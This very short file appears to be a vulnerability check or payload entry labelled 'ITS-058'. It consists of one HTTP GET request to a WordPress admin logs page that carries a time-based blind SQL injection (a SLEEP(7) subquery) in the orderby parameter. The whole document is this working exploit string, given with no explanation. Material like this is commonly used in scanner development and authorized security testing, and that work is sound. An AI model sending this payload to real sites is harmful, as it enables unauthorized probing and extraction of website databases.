# Vulnerable: ITS-058
GET /wp-admin/admin.php?page=i4t3-logs&orderby=(SELECT+*+FROM+(SELECT+SLEEP(7))XXX)--+-
